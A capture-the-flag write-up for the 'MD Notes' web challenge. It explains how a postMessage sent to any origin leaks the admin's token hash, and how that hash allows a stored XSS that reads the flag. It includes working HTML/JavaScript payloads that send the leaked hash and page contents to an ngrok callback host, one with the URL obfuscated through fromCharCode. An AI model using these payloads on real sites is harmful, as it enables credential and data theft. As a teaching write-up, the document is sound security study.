---
description: postMessage information disclosure leads to stored XSS
---

# MD Notes

## Challenge

**Description:** Here's a nice web application to host your notes.

**Author:** [yadhu#2142](https://twitter.com/YadhuKrishna\_)

{% file src="../../.gitbook/assets/md-notes.zip" %}
md-notes.zip
{% endfile %}

## Solution

We are given a Markdown Editor, where we can save our notes. As usual, an admin bot visits the URLs that we submit.

![](<../../.gitbook/assets/Screenshot 2021-08-16 at 4.37.36 PM.png>)

We're interested in creating an XSS payload, so let's analyse how the application processes our Markdown.

### Preview Function

Interestingly, the preview (right side) is an iframe of `/demo`.

```markup
<div class="col-md-6">
    <textarea id="input-area" class="form-control"></textarea>
</div>
<div class="col-md-6">
    <iframe id="frame-area" src="/demo" width="500" height="300"></iframe>
</div>
```

When clicking "Preview", a message is posted to the iframe. Note that the `targetOrigin` parameter is set to `http://${document.location.host}/`. This ensures that the message is only sent to the intended receiver.

```javascript
preview.onclick = function() {
  console.log("Sending Preview..")
	frame.contentWindow.postMessage(textarea.value, `http://${document.location.host}/`); 
	return false;
}
```

In `/demo`, the message is received and processed. The data is POST-ed to the `/api/filter` endpoint, and the sanitized HTML is added to `document.body.innerHTML`. 

```javascript
let area = document.getElementById("safe")

window.addEventListener("message", (event) => {
  console.log("Previewing..")
	let raw = event.data

	fetch("/api/filter", {
		method: "POST",
		credentials: "include",
		body: JSON.stringify({
			raw: raw
		})
	})
    .then(resp => resp.json())
	.then(response => {
		console.log("Filtered")
		document.body.innerHTML = response.Sanitized
		window.parent.postMessage(response, "*"); 
	}); 
}, false);
```

Interestingly, in line 18, the response from the `/api/filter` endpoint is also posted to `window.parent`, with the `targetOrigin` parameter set to `*`. This means that any site can create an iframe of `http://web.challenge.bi0s.in:5432/demo` and receive the message, regardless of its origin.

Notice that the user's cookies are sent along with the POST request. If the `/api/filter` endpoint returns any sensitive, user-specific data based on the user cookies, we would be able to read it! If we analyze the server code for this endpoint, we would know that it indeed returns the hash of the user's token in the response.

```go
func filterHandler(w http.ResponseWriter, r *http.Request) {
	reqBody, _ := ioutil.ReadAll(r.Body)
	w.Header().Set("Content-Type", "application/json")
	var unsanitized Unsanitized

	err := json.Unmarshal(reqBody, &unsanitized)

	if err != nil {
        
		log.Println("Error decoding JSON. err = %s", err)
        fmt.Fprintf(w, "Error decoding JSON.")
		
    } else {
		var cookie, isset = r.Cookie("Token") 
		
		hash, token := createToken()

		sanitized_data := markdown.ToHTML([]byte(sanitize(unsanitized.Raw)), nil, nil)

		if isset == nil {
			if cookie.Value == CONFIG.admin_token {
				hash = CONFIG.admin_hash
				token = CONFIG.admin_token
			}
		} 
		
		cookie = &http.Cookie{Name: "Token", Value: token, HttpOnly: true, Path: "/api"}
		result := Sanitized{Sanitized: string(sanitized_data), Raw: unsanitized.Raw, Hash: hash}
		http.SetCookie(w, cookie)
		json.NewEncoder(w).Encode(result)
	}
}
```

### Obtaining the Admin Hash

Now, we can craft a simple payload that loads `/demo` in an iframe, posts a message to trigger the `/api/filter` POST request in the context of the admin, and catches the response. We then make a callback to our exploit server, sending the admin's hash obtained from the response.

```markup
<script>
    function exploit(){
        document.getElementById("iframe").contentWindow.postMessage("test", "*")
    }
    
    window.addEventListener("message", (event) => {
        var img = new Image();
        img.src = "http://055c4d42189e.ngrok.io/?hash=" + event.data.Hash;
    }, false);
</script>
<iframe src="http://web.challenge.bi0s.in:5432/demo" id="iframe" onload="exploit();"></iframe>
```

We receive the admin's hash on our exploit server:

```
/?hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

However, the admin's hash is not sufficient to access the flag - we need to have access to the admin's token. This requires a CSRF to `/api/flag`, and due to the same-origin policy, we must still cause an XSS on the challenge server.

### Create Function

Now that we have the admin's hash, creating a stored XSS payload is pretty simple. Notice that in the `/api/create` handler, the data is _not_ sanitized if the admin's hash is used.

```go
if createpost.Hash != CONFIG.admin_hash {
    id , _ := uuid.NewV4()
    bucket = id.String()
    data = string(markdown.ToHTML([]byte(sanitize(data)), nil, nil))
} else {
    data = string(markdown.ToHTML([]byte(data), nil, nil))
}
```

Thus, simply sending a POST request to `/api/create` with the admin's hash allows us to create a stored XSS payload.

![](<../../.gitbook/assets/image (40).png>)

We can simply craft a CSRF payload that fetches `/api/flag` and makes a callback to our exploit server with the page contents. Note that single and double quotes are still escaped, so `fromCharCode()` is used to avoid that.

```markup
<script>
    fetch(String.fromCharCode(47, 97, 112, 105, 47, 102, 108, 97, 103))
    .then(function(response) {return response.text();})
    .then(function (text) {
        var img = new Image();
        img.src = String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 48, 53, 53, 99, 52, 100, 52, 50, 49, 56, 57, 101, 46, 110, 103, 114, 111, 107, 46, 105, 111, 47, 63, 100, 97, 116, 97, 61) + encodeURIComponent(text);
    })
</script>
```

Receiving the `/api/flag` contents:

![](<../../.gitbook/assets/image (41).png>)

URL-decode the output, and we get the flag: `inctf{8d739_csrf_is_fun_3d587ec9}`
